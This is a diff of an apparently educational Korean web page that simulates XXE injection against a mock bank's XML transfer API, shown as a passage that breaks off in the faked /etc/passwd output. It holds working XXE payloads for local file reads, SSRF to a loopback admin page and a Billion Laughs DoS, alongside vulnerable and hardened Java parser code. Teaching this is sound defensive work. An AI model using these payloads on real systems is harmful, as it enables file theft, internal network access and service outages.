@@ -3,120 +3,799 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>XXE Injection</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <title>금융권 XXE Injection 모의해킹 시뮬레이터 - WEB-SER-015</title>
+    <script src="https://cdn.tailwindcss.com?plugins=forms"></script>
+    <script>
+        tailwind.config = { theme: { extend: {} } }
+    </script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+KR:wght@300;400;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+KR:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Noto Sans KR', sans-serif; }
         .code-font { font-family: 'JetBrains Mono', monospace; }
+        
+        @keyframes slideIn { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
+        
+        .animate-slide { animation: slideIn 0.5s ease-out; }
+        .animate-shake { animation: shake 0.3s ease-in-out; }
+        .animate-pulse-slow { animation: pulse 2s infinite; }
+        .animate-blink { animation: blink 1s infinite; }
     </style>
 </head>
-<body class="bg-slate-50 p-8 h-screen flex flex-col">
+<body class="bg-gradient-to-br from-slate-900 via-slate-800 to-purple-900 min-h-screen p-4 md:p-8">
 
-    <div class="mb-6">
-        <div class="flex items-center gap-3 mb-2">
-            <div class="p-2 bg-pink-100 text-pink-600 rounded-lg">
-                <i class="fas fa-file-code text-xl"></i>
+    <!-- 평가기준 배너 -->
+    <div class="max-w-7xl mx-auto mb-6">
+        <div class="bg-gradient-to-r from-purple-600 to-pink-700 border-l-4 border-yellow-400 p-4 rounded-lg backdrop-blur-sm shadow-xl">
+            <div class="flex items-start gap-3 text-white">
+                <i class="fa-solid fa-clipboard-check text-yellow-300 text-2xl mt-0.5"></i>
+                <div class="flex-1">
+                    <p class="font-bold text-lg flex items-center gap-2">
+                        📋 전자금융기반시설 보안 취약점 평가기준
+                        <span class="text-xs bg-yellow-400 text-slate-900 px-2 py-1 rounded font-black">WEB-SER-015</span>
+                    </p>
+                    <div class="mt-2 text-sm space-y-1 text-purple-100">
+                        <div><strong>평가항목:</strong> XML 외부객체 공격 (XXE - XML External Entity)</div>
+                        <div><strong>위험도:</strong> <span class="text-red-300 font-bold">5 (최고위험)</span></div>
+                        <div><strong>통제구분:</strong> 5.8.4 (일반공통) 서비스 보호</div>
+                        <div><strong>진단내용:</strong> XML 구문 분석기의 입력값 검증 누락으로 시스템 자원 접근 가능 여부 점검</div>
+                    </div>
+                </div>
             </div>
-            <h1 class="text-2xl font-bold text-slate-800">XXE Injection (XML External Entity)</h1>
         </div>
-        <p class="text-slate-500 text-sm">
-            취약한 XML 파서가 외부 엔티티 참조를 처리할 때 발생하는 취약점으로, 공격자가 시스템 파일을 읽거나 내부 네트워크를 스캔할 수 있습니다.
-        </p>
     </div>
 
-    <div class="flex-1 grid grid-cols-1 md:grid-cols-2 gap-8">
-        
-        <!-- Input Area -->
-        <div class="flex flex-col gap-4">
-            <div class="bg-white p-6 rounded-xl shadow-sm border border-slate-200 flex-1">
-                <h3 class="font-bold text-lg mb-4 text-slate-700">제품 검색 API (XML)</h3>
-                <textarea id="xml-input" class="w-full h-48 p-4 border border-slate-300 rounded code-font text-sm bg-slate-50 focus:ring-2 focus:ring-pink-500 outline-none" spellcheck="false">
-<?xml version="1.0" encoding="UTF-8"?>
-<search>
-  <keyword>iphone</keyword>
-</search></textarea>
-                
-                <div class="flex justify-between mt-4">
-                    <button onclick="resetXML()" class="text-sm text-slate-500 hover:text-slate-700 underline">Reset</button>
-                    <button onclick="simXXE()" class="bg-pink-600 hover:bg-pink-700 text-white font-bold py-2 px-6 rounded transition">
-                        XML 전송
-                    </button>
-                </div>
-            </div>
-
-            <div class="bg-slate-100 p-4 rounded-xl border border-slate-200">
-                <p class="font-bold text-slate-600 mb-2">Exploit Payload:</p>
-                <div class="bg-white p-3 border border-slate-300 rounded cursor-pointer hover:bg-pink-50 transition group" onclick="setPayload()">
-                    <code class="text-pink-600 text-xs block whitespace-pre-wrap group-hover:text-pink-700">&lt;!DOCTYPE foo [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt; 
-]&gt;
-&lt;search&gt;
-  &lt;keyword&gt;&xxe;&lt;/keyword&gt;
-&lt;/search&gt;</code>
-                    <div class="text-[10px] text-slate-400 mt-2 text-right">클릭하여 적용</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Output Area -->
-        <div class="bg-slate-900 rounded-xl shadow-lg border border-slate-700 p-6 flex flex-col">
-            <div class="flex justify-between items-center mb-4 border-b border-slate-700 pb-2">
-                <span class="text-slate-400 font-mono text-xs">Server Response</span>
-                <span id="status-badge" class="bg-green-500 text-slate-900 text-[10px] font-bold px-2 py-0.5 rounded">200 OK</span>
-            </div>
+    <div class="max-w-7xl mx-auto">
+        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
             
-            <div id="response-output" class="flex-1 font-mono text-sm text-slate-300 overflow-auto whitespace-pre-wrap">Waiting for request...</div>
+            <!-- 좌측: XML 입력 영역 -->
+            <div class="lg:col-span-1 space-y-6">
+                
+                <!-- 금융사 헤더 -->
+                <div class="bg-gradient-to-r from-blue-600 to-indigo-700 p-5 rounded-2xl shadow-2xl text-white">
+                    <div class="flex items-center gap-3 mb-2">
+                        <i class="fa-solid fa-building-columns text-3xl"></i>
+                        <div>
+                            <h1 class="text-xl font-black">OO은행</h1>
+                            <p class="text-blue-100 text-xs">기업뱅킹 API 시스템</p>
+                        </div>
+                    </div>
+                    <div class="mt-3 flex items-center gap-2 text-xs bg-red-500/30 px-3 py-2 rounded-lg backdrop-blur-sm border border-red-400">
+                        <i class="fa-solid fa-shield-xmark text-red-200"></i>
+                        <span class="font-bold">취약점: XML Parser 설정 미흡</span>
+                    </div>
+                </div>
+
+                <!-- XML 입력 폼 -->
+                <div class="bg-white rounded-2xl shadow-2xl border-t-4 border-purple-500 overflow-hidden">
+                    <div class="bg-gradient-to-r from-slate-50 to-slate-100 p-4 border-b-2 border-slate-200">
+                        <h3 class="font-bold text-base text-slate-800 flex items-center gap-2">
+                            <i class="fa-solid fa-exchange-alt text-purple-600"></i>
+                            계좌이체 XML API
+                        </h3>
+                        <p class="text-xs text-slate-500 mt-1">B2B 기업고객 대량이체 서비스</p>
+                    </div>
+                    
+                    <div class="p-5">
+                        <label class="block text-xs font-bold text-slate-700 mb-2 uppercase tracking-wide">
+                            <i class="fa-solid fa-code mr-1"></i> XML Request Body
+                        </label>
+                        <textarea id="xml-input" 
+                                  class="w-full h-48 p-3 border-2 border-slate-300 rounded-lg code-font text-xs bg-slate-50 focus:ring-2 focus:ring-purple-500 outline-none resize-none" 
+                                  spellcheck="false">
+<?xml version="1.0" encoding="UTF-8"?>
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>급여이체</desc>
+</transfer></textarea>
+                        
+                        <div class="flex justify-between items-center mt-4">
+                            <button onclick="resetXML()" 
+                                    class="text-sm text-slate-500 hover:text-slate-700 underline flex items-center gap-1">
+                                <i class="fa-solid fa-rotate-left"></i> Reset
+                            </button>
+                            <button onclick="sendXML()" 
+                                    class="bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-bold py-2 px-6 rounded-lg transition transform active:scale-95 flex items-center gap-2">
+                                <i class="fa-solid fa-paper-plane"></i>
+                                이체 요청
+                            </button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 공격 시나리오 -->
+                <div class="bg-slate-800 rounded-2xl shadow-xl border border-slate-700 p-5">
+                    <h3 class="font-bold text-sm text-slate-200 mb-3 flex items-center gap-2">
+                        <i class="fa-solid fa-flask text-red-400"></i>
+                        모의해킹 시나리오
+                    </h3>
+                    <div class="space-y-2">
+                        <button onclick="setPayload('file')" 
+                                class="w-full text-left px-3 py-2 bg-red-900/30 hover:bg-red-900/50 rounded-lg text-xs font-bold text-red-300 border border-red-700 transition">
+                            <i class="fa-solid fa-file-code"></i> 시나리오 1: 파일 읽기
+                        </button>
+                        
+                        <button onclick="setPayload('db')" 
+                                class="w-full text-left px-3 py-2 bg-orange-900/30 hover:bg-orange-900/50 rounded-lg text-xs font-bold text-orange-300 border border-orange-700 transition">
+                            <i class="fa-solid fa-database"></i> 시나리오 2: DB 설정 탈취
+                        </button>
+                        
+                        <button onclick="setPayload('ssrf')" 
+                                class="w-full text-left px-3 py-2 bg-purple-900/30 hover:bg-purple-900/50 rounded-lg text-xs font-bold text-purple-300 border border-purple-700 transition">
+                            <i class="fa-solid fa-network-wired"></i> 시나리오 3: SSRF 공격
+                        </button>
+                        
+                        <button onclick="setPayload('dos')" 
+                                class="w-full text-left px-3 py-2 bg-yellow-900/30 hover:bg-yellow-900/50 rounded-lg text-xs font-bold text-yellow-300 border border-yellow-700 transition">
+                            <i class="fa-solid fa-bomb"></i> 시나리오 4: DoS 공격
+                        </button>
+                    </div>
+                </div>
+
+                <!-- 취약한 코드 -->
+                <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-red-500">
+                    <div class="bg-red-900/50 px-4 py-3 border-b border-red-700 flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-skull-crossbones text-red-400"></i>
+                            <span class="text-sm font-bold text-red-200">취약한 Java 코드</span>
+                        </div>
+                        <span class="text-xs bg-red-600 text-white px-2 py-1 rounded font-bold">위험</span>
+                    </div>
+                    
+                    <div class="p-4 code-font text-xs leading-relaxed text-slate-300 max-h-[300px] overflow-y-auto">
+<pre>// ❌ 취약한 XML Parser
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+<span class="text-red-400">// External Entity 활성화 (기본)</span>
+DocumentBuilder builder = 
+    factory.newDocumentBuilder();
+    
+Document doc = builder.parse(
+    new InputSource(
+        new StringReader(xmlInput)
+    )
+);
+
+<span class="text-red-400">// 문제: XXE 공격 취약!</span></pre>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- 중앙: 서버 프로세스 모니터 -->
+            <div class="lg:col-span-1 space-y-6">
+                
+                <!-- XML 파싱 단계 -->
+                <div class="bg-slate-900 rounded-2xl shadow-2xl border border-slate-700 overflow-hidden">
+                    <div class="bg-gradient-to-r from-slate-800 to-slate-700 px-4 py-3 border-b border-slate-600">
+                        <h2 class="font-bold text-base text-white flex items-center gap-2">
+                            <i class="fa-solid fa-microchip"></i>
+                            XML Parser 처리 과정
+                        </h2>
+                    </div>
+
+                    <div id="parserMonitor" class="p-5 min-h-[400px] flex items-center justify-center">
+                        <div class="text-center text-slate-500">
+                            <i class="fa-solid fa-file-code text-5xl mb-3 opacity-30"></i>
+                            <p class="text-sm">대기 중...</p>
+                        </div>
+                    </div>
+
+                    <!-- 파싱 단계 -->
+                    <div id="parsingStages" class="hidden p-5 space-y-3">
+                        
+                        <!-- Stage 1 -->
+                        <div id="stage1" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                            <div class="flex-shrink-0 w-6 h-6 rounded-full bg-blue-500 flex items-center justify-center text-white font-bold text-xs">
+                                1
+                            </div>
+                            <div class="flex-1">
+                                <div class="font-bold text-blue-300 text-xs">XML 수신</div>
+                                <div class="text-xs text-slate-400" id="stage1Text">...</div>
+                            </div>
+                            <i id="stage1Icon" class="fa-solid fa-check-circle text-green-400"></i>
+                        </div>
+
+                        <!-- Stage 2 -->
+                        <div id="stage2" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                            <div class="flex-shrink-0 w-6 h-6 rounded-full bg-purple-500 flex items-center justify-center text-white font-bold text-xs">
+                                2
+                            </div>
+                            <div class="flex-1">
+                                <div class="font-bold text-purple-300 text-xs">DOCTYPE 확인</div>
+                                <div class="text-xs text-slate-400 code-font" id="stage2Text">...</div>
+                            </div>
+                            <i id="stage2Icon" class="fa-solid fa-spinner fa-spin text-purple-400"></i>
+                        </div>
+
+                        <!-- Stage 3 -->
+                        <div id="stage3" class="flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                            <div class="flex-shrink-0 w-6 h-6 rounded-full bg-yellow-500 flex items-center justify-center text-white font-bold text-xs">
+                                3
+                            </div>
+                            <div class="flex-1">
+                                <div class="font-bold text-yellow-300 text-xs">ENTITY 처리</div>
+                                <div class="text-xs text-slate-400" id="stage3Text">...</div>
+                            </div>
+                            <i id="stage3Icon" class="fa-solid fa-hourglass-half text-yellow-400"></i>
+                        </div>
+
+                        <!-- Stage 4 - 외부 자원 접근 -->
+                        <div id="stage4" class="hidden flex items-start gap-2 bg-red-900/30 border-l-4 border-red-500 p-3 rounded-r-lg animate-shake">
+                            <div class="flex-shrink-0 w-6 h-6 rounded-full bg-red-600 flex items-center justify-center text-white">
+                                <i class="fa-solid fa-exclamation text-xs"></i>
+                            </div>
+                            <div class="flex-1">
+                                <div class="font-bold text-red-300 text-xs">⚠️ 외부 자원 접근!</div>
+                                <div class="text-xs text-red-200" id="stage4Text">...</div>
+                            </div>
+                        </div>
+
+                        <!-- Stage 5 - 파일 읽기 -->
+                        <div id="stage5" class="hidden flex items-start gap-2 opacity-0 transition-opacity duration-500">
+                            <div class="flex-shrink-0 w-6 h-6 rounded-full bg-orange-500 flex items-center justify-center text-white font-bold text-xs">
+                                5
+                            </div>
+                            <div class="flex-1">
+                                <div class="font-bold text-orange-300 text-xs">파일 시스템 접근</div>
+                                <div class="text-xs text-orange-200 code-font" id="stage5Text">...</div>
+                            </div>
+                            <i id="stage5Icon" class="fa-solid fa-folder-open text-orange-400 animate-blink"></i>
+                        </div>
+
+                        <!-- Terminal Output -->
+                        <div id="terminalOutput" class="hidden mt-3 bg-black/50 rounded-lg p-3 border border-purple-500/30 max-h-[200px] overflow-y-auto">
+                            <div class="flex items-center gap-2 mb-2 text-purple-400 text-xs font-bold">
+                                <i class="fa-solid fa-terminal"></i>
+                                <span>SYSTEM OUTPUT</span>
+                            </div>
+                            <div id="terminalLines" class="code-font text-xs space-y-1 text-green-300"></div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <!-- 공격 타임라인 -->
+                <div id="attackTimeline" class="hidden animate-slide">
+                    <div class="bg-gradient-to-br from-red-900/40 to-orange-900/40 border-2 border-red-500 rounded-2xl p-5 backdrop-blur-sm">
+                        <h4 class="font-bold text-red-300 mb-3 flex items-center gap-2">
+                            <i class="fa-solid fa-clock-rotate-left"></i>
+                            공격 타임라인
+                        </h4>
+                        <div id="timelineContent" class="space-y-2 text-xs text-red-200"></div>
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- 우측: 결과 & 안전한 코드 -->
+            <div class="lg:col-span-1 space-y-6">
+                
+                <!-- 서버 응답 -->
+                <div class="bg-slate-900 rounded-2xl shadow-2xl border border-slate-700 overflow-hidden">
+                    <div class="bg-slate-800 px-4 py-3 border-b border-slate-700 flex justify-between items-center">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-terminal text-green-400"></i>
+                            <span class="text-slate-300 font-mono text-xs font-bold">Server Response</span>
+                        </div>
+                        <span id="status-badge" class="bg-green-500 text-slate-900 text-xs font-bold px-3 py-1 rounded">
+                            대기중
+                        </span>
+                    </div>
+                    
+                    <div id="response-output" 
+                         class="p-5 min-h-[300px] code-font text-xs text-slate-300 overflow-auto whitespace-pre-wrap bg-black/30">
+Waiting for XML request...</div>
+                </div>
+
+                <!-- 안전한 Java 코드 -->
+                <div class="bg-slate-900 rounded-2xl shadow-2xl overflow-hidden border border-emerald-500">
+                    <div class="bg-emerald-900/50 px-4 py-3 border-b border-emerald-700 flex items-center justify-between">
+                        <div class="flex items-center gap-2">
+                            <i class="fa-solid fa-shield-halved text-emerald-400"></i>
+                            <span class="text-sm font-bold text-emerald-200">안전한 Java 코드</span>
+                        </div>
+                        <span class="text-xs bg-emerald-600 text-white px-2 py-1 rounded font-bold">권장</span>
+                    </div>
+                    
+                    <div class="p-4 code-font text-xs leading-relaxed text-slate-300 max-h-[400px] overflow-y-auto">
+<pre>// ✅ 안전한 XML Parser 설정
+DocumentBuilderFactory factory = 
+    DocumentBuilderFactory.newInstance();
+
+<span class="text-emerald-400">// 1. DOCTYPE 선언 차단</span>
+factory.setFeature(
+    "http://apache.org/xml/features/" +
+    "disallow-doctype-decl", true);
+
+<span class="text-emerald-400">// 2. External Entities 비활성화</span>
+factory.setFeature(
+    "http://xml.org/sax/features/" +
+    "external-general-entities", false);
+
+factory.setFeature(
+    "http://xml.org/sax/features/" +
+    "external-parameter-entities", false);
+
+<span class="text-emerald-400">// 3. XInclude 비활성화</span>
+factory.setXIncludeAware(false);
+
+<span class="text-emerald-400">// 4. Expand Entity 비활성화</span>
+factory.setExpandEntityReferences(false);
+
+<span class="text-emerald-400">// 입력값 검증</span>
+if (xmlInput.contains("&lt;!DOCTYPE") || 
+    xmlInput.contains("&lt;!ENTITY")) {
+    throw new SecurityException(
+        "DOCTYPE/ENTITY not allowed");
+}
+
+DocumentBuilder builder = 
+    factory.newDocumentBuilder();
+Document doc = builder.parse(
+    new InputSource(
+        new StringReader(xmlInput)
+    )
+);</pre>
+                    </div>
+                </div>
+
+                <!-- 피해 시나리오 -->
+                <div id="damageScenario" class="hidden animate-slide">
+                    <div class="bg-gradient-to-br from-red-600 to-red-800 rounded-2xl shadow-xl p-5 text-white">
+                        <h3 class="font-bold text-lg mb-3 flex items-center gap-2">
+                            <i class="fa-solid fa-fire-flame-curved text-yellow-400"></i>
+                            실제 금융권 피해 시나리오
+                        </h3>
+                        <div class="space-y-3 text-sm">
+                            <div class="flex items-start gap-3 bg-white/10 p-3 rounded-lg backdrop-blur-sm">
+                                <i class="fa-solid fa-1 text-yellow-400 mt-1"></i>
+                                <div>
+                                    <div class="font-bold mb-1">시스템 파일 유출</div>
+                                    <div class="text-red-100">database.php, .env, 설정파일 등 민감정보 탈취</div>
+                                </div>
+                            </div>
+                            <div class="flex items-start gap-3 bg-white/10 p-3 rounded-lg backdrop-blur-sm">
+                                <i class="fa-solid fa-2 text-yellow-400 mt-1"></i>
+                                <div>
+                                    <div class="font-bold mb-1">DB 접속정보 탈취</div>
+                                    <div class="text-red-100">전체 고객 데이터베이스 무단 접근 가능</div>
+                                </div>
+                            </div>
+                            <div class="flex items-start gap-3 bg-white/10 p-3 rounded-lg backdrop-blur-sm">
+                                <i class="fa-solid fa-3 text-yellow-400 mt-1"></i>
+                                <div>
+                                    <div class="font-bold mb-1">내부 네트워크 스캔</div>
+                                    <div class="text-red-100">SSRF로 관리 시스템, DB 서버 등 노출</div>
+                                </div>
+                            </div>
+                            <div class="flex items-start gap-3 bg-white/10 p-3 rounded-lg backdrop-blur-sm">
+                                <i class="fa-solid fa-4 text-yellow-400 mt-1"></i>
+                                <div>
+                                    <div class="font-bold mb-1">서비스 거부 (DoS)</div>
+                                    <div class="text-red-100">Billion Laughs로 서버 다운, 고객 거래 중단</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- 평가 판정 -->
+                <div id="judgementBox" class="hidden bg-slate-900 rounded-xl p-4 border border-slate-700 animate-slide">
+                    <div class="flex items-center gap-2 mb-2 text-indigo-400 font-bold text-xs">
+                        <i class="fa-solid fa-gavel"></i>
+                        <span>평가 판정</span>
+                    </div>
+                    <div class="text-xs space-y-1 text-slate-400">
+                        <div><strong class="text-white">평가항목:</strong> WEB-SER-015 XML 외부객체 공격</div>
+                        <div><strong class="text-white">판정:</strong> <span id="judgement" class="font-bold"></span></div>
+                        <div><strong class="text-white">근거:</strong> <span id="evidence"></span></div>
+                    </div>
+                </div>
+
+            </div>
         </div>
     </div>
 
     <script>
-        const defaultXML = `<?xml version="1.0" encoding="UTF-8"?>\n<search>\n  <keyword>iphone</keyword>\n</search>`;
-        
-        const exploitXML = `<?xml version="1.0" encoding="UTF-8"?>
+        const defaultXML = `<?xml version="1.0" encoding="UTF-8"?>
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>급여이체</desc>
+</transfer>`;
+
+        const payloads = {
+            file: `<?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE foo [
-  <!ENTITY xxe SYSTEM "file:///etc/passwd"> 
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<search>
-  <keyword>&xxe;</keyword>
-</search>`;
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>&xxe;</desc>
+</transfer>`,
+            
+            db: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///var/www/bank/config/database.php">
+]>
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>&xxe;</desc>
+</transfer>`,
+            
+            ssrf: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin/status">
+]>
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>&xxe;</desc>
+</transfer>`,
+            
+            dos: `<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+]>
+<transfer>
+  <from>123-456-789</from>
+  <to>987-654-321</to>
+  <amount>1000000</amount>
+  <desc>&lol4;</desc>
+</transfer>`
+        };
 
         function resetXML() {
             document.getElementById('xml-input').value = defaultXML;
+            document.getElementById('parserMonitor').classList.remove('hidden');
+            document.getElementById('parsingStages').classList.add('hidden');
+            document.getElementById('attackTimeline').classList.add('hidden');
+            document.getElementById('damageScenario').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            
+            document.getElementById('status-badge').innerText = '대기중';
+            document.getElementById('status-badge').className = 'bg-green-500 text-slate-900 text-xs font-bold px-3 py-1 rounded';
+            document.getElementById('response-output').innerText = 'Waiting for XML request...';
         }
 
-        function setPayload() {
-            document.getElementById('xml-input').value = exploitXML;
+        function setPayload(type) {
+            document.getElementById('xml-input').value = payloads[type];
         }
 
-        function simXXE() {
+        async function sendXML() {
             const input = document.getElementById('xml-input').value;
             const output = document.getElementById('response-output');
             const badge = document.getElementById('status-badge');
-
-            output.innerHTML = '<span class="text-yellow-400">Processing XML...</span>';
             
-            setTimeout(() => {
-                if (input.includes('file:///etc/passwd') && input.includes('&xxe;')) {
-                    // Success Scenario
-                    const passwdContent = `root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-... (system file leaked)`;
+            // UI 초기화
+            document.getElementById('parserMonitor').classList.add('hidden');
+            document.getElementById('parsingStages').classList.remove('hidden');
+            document.getElementById('stage4').classList.add('hidden');
+            document.getElementById('stage5').classList.add('hidden');
+            document.getElementById('terminalOutput').classList.add('hidden');
+            document.getElementById('attackTimeline').classList.add('hidden');
+            document.getElementById('damageScenario').classList.add('hidden');
+            document.getElementById('judgementBox').classList.add('hidden');
+            document.getElementById('terminalLines').innerHTML = '';
+            
+            ['stage1', 'stage2', 'stage3', 'stage5'].forEach(id => {
+                document.getElementById(id).style.opacity = '0';
+            });
+
+            badge.innerText = '처리중...';
+            badge.className = 'bg-yellow-500 text-slate-900 text-xs font-bold px-3 py-1 rounded animate-pulse-slow';
+            output.innerHTML = '<span class="text-yellow-400">🔄 XML 파싱 중...</span>';
+
+            await sleep(500);
+
+            // Stage 1: XML 수신
+            document.getElementById('stage1').style.opacity = '1';
+            document.getElementById('stage1Text').innerText = 'XML 데이터 수신 완료';
+            await sleep(700);
+
+            // Stage 2: DOCTYPE 확인
+            document.getElementById('stage2').style.opacity = '1';
+            const hasDoctype = input.includes('<!DOCTYPE');
+            if (hasDoctype) {
+                document.getElementById('stage2Text').innerText = '<!DOCTYPE 선언 발견';
+                document.getElementById('stage2Icon').className = 'fa-solid fa-exclamation-triangle text-orange-400';
+            } else {
+                document.getElementById('stage2Text').innerText = 'DOCTYPE 없음';
+                document.getElementById('stage2Icon').className = 'fa-solid fa-check-circle text-green-400';
+            }
+            await sleep(800);
+
+            // Stage 3: ENTITY 처리
+            document.getElementById('stage3').style.opacity = '1';
+            const hasEntity = input.includes('<!ENTITY');
+            
+            if (hasEntity) {
+                document.getElementById('stage3Text').innerText = 'ENTITY 선언 발견 - 처리 중...';
+                document.getElementById('stage3Icon').className = 'fa-solid fa-cog fa-spin text-yellow-400';
+                await sleep(1000);
+
+                // Stage 4: 외부 자원 접근 감지
+                if (input.includes('SYSTEM')) {
+                    document.getElementById('stage4').classList.remove('hidden');
                     
-                    output.innerHTML = `<span class="text-green-400">Found results for keyword:</span>\n\n<span class="text-red-400 font-bold">${passwdContent}</span>`;
-                    badge.innerText = "XXE SUCCESS";
-                    badge.className = "bg-red-500 text-white text-[10px] font-bold px-2 py-0.5 rounded animate-pulse";
-                } else {
-                    // Normal Scenario
-                    output.innerHTML = `<span class="text-green-400">Search results for "iphone":</span>\n\n1. iPhone 15 Pro - $999\n2. iPhone 14 - $799\n3. iPhone SE - $429`;
-                    badge.innerText = "200 OK";
-                    badge.className = "bg-green-500 text-slate-900 text-[10px] font-bold px-2 py-0.5 rounded";
+                    if (input.includes('file://')) {
+                        document.getElementById('stage4Text').innerText = 'SYSTEM "file://..." 외부 파일 접근 시도 감지!';
+                        await sleep(800);
+                        
+                        // Stage 5: 파일 읽기
+                        document.getElementById('stage5').classList.remove('hidden');
+                        document.getElementById('stage5').style.opacity = '1';
+                        
+                        if (input.includes('/etc/passwd')) {
+                            document.getElementById('stage5Text').innerText = 'file:///etc/passwd';
+                            await executeFileAttack('passwd');
+                        } else if (input.includes('database.php')) {
+                            document.getElementById('stage5Text').innerText = 'file:///var/www/.../database.php';
+                            await executeFileAttack('db');
+                        }
+                        
+                    } else if (input.includes('http://') || input.includes('https://')) {
+                        document.getElementById('stage4Text').innerText = 'SYSTEM "http://..." 네트워크 접근 시도 감지!';
+                        await sleep(800);
+                        
+                        document.getElementById('stage5').classList.remove('hidden');
+                        document.getElementById('stage5').style.opacity = '1';
+                        document.getElementById('stage5Text').innerText = 'http://127.0.0.1:8080/admin';
+                        document.getElementById('stage5Icon').className = 'fa-solid fa-network-wired text-purple-400 animate-blink';
+                        
+                        await executeSSRFAttack();
+                    }
                 }
-            }, 600);
+                
+                // Billion Laughs 공격
+                if (input.includes('&lol')) {
+                    document.getElementById('stage3Icon').className = 'fa-solid fa-circle-exclamation text-red-400 animate-blink';
+                    await executeDosAttack();
+                }
+                
+            } else {
+                // 정상 처리
+                document.getElementById('stage3Text').innerText = 'ENTITY 없음 - 정상 파싱';
+                document.getElementById('stage3Icon').className = 'fa-solid fa-check-circle text-green-400';
+                await sleep(800);
+                
+                showNormalResult();
+            }
+        }
+
+        async function executeFileAttack(type) {
+            const output = document.getElementById('response-output');
+            const badge = document.getElementById('status-badge');
+            const timeline = document.getElementById('attackTimeline');
+            const timelineContent = document.getElementById('timelineContent');
+            
+            // 터미널 출력
+            document.getElementById('terminalOutput').classList.remove('hidden');
+            addTerminalLine('> XML Parser: DOCTYPE 처리 중...', 'text-blue-300');
+            await sleep(500);
+            addTerminalLine('> ENTITY xxe 발견', 'text-yellow-300');
+            await sleep(500);
+            addTerminalLine('> 외부 자원 해석: file:///...', 'text-orange-300');
+            await sleep(500);
+            addTerminalLine('> [!] 파일 시스템 접근 시도', 'text-red-400 font-bold');
+            await sleep(700);
+
+            // 타임라인 표시
+            timeline.classList.remove('hidden');
+            timelineContent.innerHTML = `
+                <div class="flex items-center gap-2"><i class="fa-solid fa-clock"></i> 14:23:45.123 - XML 파싱 시작</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-clock"></i> 14:23:45.456 - DOCTYPE 선언 발견</div>
+                <div class="flex items-center gap-2"><i class="fa-solid fa-clock"></i> 14:23:45.789 - ENTITY xxe 처리 중</div>
+                <div class="flex items-center gap-2 text-red-300 font-bold"><i class="fa-solid fa-exclamation-triangle"></i> 14:23:46.012 - 외부 파일 접근!</div>
+            `;
+
+            if (type === 'passwd') {
+                addTerminalLine('> 파일 읽기: /etc/passwd', 'text-red-300');
+                await sleep(500);
+                addTerminalLine('> root:x:0:0:root:/root:/bin/bash', 'text-red-400');
+                addTerminalLine('> www-data:x:33:33:...', 'text-red-400');
+                
+                const passwdContent = `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:104:108:MySQL Server:/nonexistent:/bin/false
